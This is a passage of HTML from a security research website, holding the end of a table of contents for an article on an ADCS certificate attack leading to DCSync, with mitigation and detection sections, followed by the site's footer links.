1.1: Discover ADCS Infrastructure</a></li><li><a href="#step-12-enumerate-certificate-templates" class="table-of-contents__link toc-highlight">Step 1.2: Enumerate Certificate Templates</a></li><li><a href="#step-13-verify-http-endpoint-accessibility" class="table-of-contents__link toc-highlight">Step 1.3: Verify HTTP Endpoint Accessibility</a></li></ul></li><li><a href="#phase-2-certificate-request-direct-method" class="table-of-contents__link toc-highlight">Phase 2: Certificate Request (Direct Method)</a><ul><li><a href="#step-21-request-certificate-using-low-privilege-credentials" class="table-of-contents__link toc-highlight">Step 2.1: Request Certificate Using Low-Privilege Credentials</a></li><li><a href="#step-22-verify-certificate-contents" class="table-of-contents__link toc-highlight">Step 2.2: Verify Certificate Contents</a></li></ul></li><li><a href="#phase-3-certificate-based-authentication" class="table-of-contents__link toc-highlight">Phase 3: Certificate-Based Authentication</a><ul><li><a href="#step-31-authenticate-using-certificate" class="table-of-contents__link toc-highlight">Step 3.1: Authenticate Using Certificate</a></li><li><a href="#step-32-verify-authentication" class="table-of-contents__link toc-highlight">Step 3.2: Verify Authentication</a></li></ul></li><li><a href="#phase-4-domain-compromise" class="table-of-contents__link toc-highlight">Phase 4: Domain Compromise</a><ul><li><a href="#step-41-perform-dcsync-attack" class="table-of-contents__link toc-highlight">Step 4.1: Perform DCSync Attack</a></li><li><a href="#step-42-verify-domain-compromise" class="table-of-contents__link toc-highlight">Step 4.2: Verify Domain Compromise</a></li></ul></li><li><a href="#attack-execution" class="table-of-contents__link toc-highlight">Attack Execution</a><ul><li><a href="#complete-attack-timeline" class="table-of-contents__link toc-highlight">Complete Attack Timeline</a></li><li><a href="#real-attack-execution-log" class="table-of-contents__link toc-highlight">Real Attack Execution Log</a></li></ul></li><li><a href="#defense-and-mitigation" class="table-of-contents__link toc-highlight">Defense and Mitigation</a></li><li><a href="#immediate-mitigation" class="table-of-contents__link toc-highlight">Immediate Mitigation</a><ul><li><a href="#1-disable-http-web-enrollment" class="table-of-contents__link toc-highlight">1. Disable HTTP Web Enrollment</a></li><li><a href="#2-enable-https-for-web-enrollment" class="table-of-contents__link toc-highlight">2. Enable HTTPS for Web Enrollment</a></li><li><a href="#3-secure-certificate-templates" class="table-of-contents__link toc-highlight">3. Secure Certificate Templates</a></li></ul></li><li><a href="#long-term-security-measures" class="table-of-contents__link toc-highlight">Long-Term Security Measures</a><ul><li><a href="#1-network-segmentation" class="table-of-contents__link toc-highlight">1. Network Segmentation</a></li><li><a href="#2-monitoring-and-alerting" class="table-of-contents__link toc-highlight">2. Monitoring and Alerting</a></li><li><a href="#3-access-controls" class="table-of-contents__link toc-highlight">3. Access Controls</a></li><li><a href="#4-regular-security-assessments" class="table-of-contents__link toc-highlight">4. Regular Security Assessments</a></li></ul></li><li><a href="#detection-and-monitoring" class="table-of-contents__link toc-highlight">Detection and Monitoring</a><ul><li><a href="#indicators-of-compromise-iocs" class="table-of-contents__link toc-highlight">Indicators of Compromise (IOCs)</a></li><li><a href="#1-certificate-request-anomalies" class="table-of-contents__link toc-highlight">1. Certificate Request Anomalies</a></li><li><a href="#2-ntlm-relay-attempts" class="table-of-contents__link toc-highlight">2. NTLM Relay Attempts</a></li><li><a href="#3-certificate-based-authentication" class="table-of-contents__link toc-highlight">3. Certificate-Based Authentication</a></li><li><a href="#4-dcsync-activity" class="table-of-contents__link toc-highlight">4. DCSync Activity</a></li></ul></li><li><a href="#detection-queries" class="table-of-contents__link toc-highlight">Detection Queries</a><ul><li><a href="#splunk-query-example" class="table-of-contents__link toc-highlight">Splunk Query Example</a></li><li><a href="#powershell-detection-script" class="table-of-contents__link toc-highlight">PowerShell Detection Script</a></li></ul></li><li><a href="#conclusion" class="table-of-contents__link toc-highlight">Conclusion</a></li><li><a href="#key-takeaways" class="table-of-contents__link toc-highlight">Key Takeaways</a></li><li><a href="#attack-complexity-rating" class="table-of-contents__link toc-highlight">Attack Complexity Rating</a></li><li><a href="#why-this-attack-matters" class="table-of-contents__link toc-highlight">Why This Attack Matters</a></li><li><a href="#final-recommendations" class="table-of-contents__link toc-highlight">Final Recommendations</a><ul><li><a href="#references-and-resources" class="table-of-contents__link toc-highlight">References and Resources</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="site-footer" data-site-shell="standalone" data-site-shell-version="2026-07-24.1"><div class="shared-footer-inner"><a class="shared-footer-brand" href="/"><img src="/assets/ap-logo.png" alt="" width="32" height="32" loading="lazy" decoding="async"><span><strong>Andrey Pautov</strong><small>Security research</small></span></a><nav class="shared-footer-links" aria-label="Footer navigation"><a href="/cti.html">Research</a><a href="/guides.html">Library</a><a href="/projects.html">Products &amp; Labs</a><a href="/adversarygraph/">AdversaryGraph</a><a href="/about.html">About</a></nav><nav class="shared-footer-meta" aria-label="Site information"><a href="/privacy.html">Privacy / Data Handling</a><a href="/about.html#contact">Contact</a><a href="https://github.com/anpa1200" target="_blank" rel="noopener noreferrer">GitHub<span class="visually-hidden"> (opens in a new tab)</span><span aria-hidden="true"> ↗</span></a></nav></div><div class="shared-footer-bottom"><span>© <!-- -->2026<!-- --> Andrey Pautov · Original research and tooling</span><a href="#top" data-back-to-top="true">Back to top ↑</a></div></footer></div>
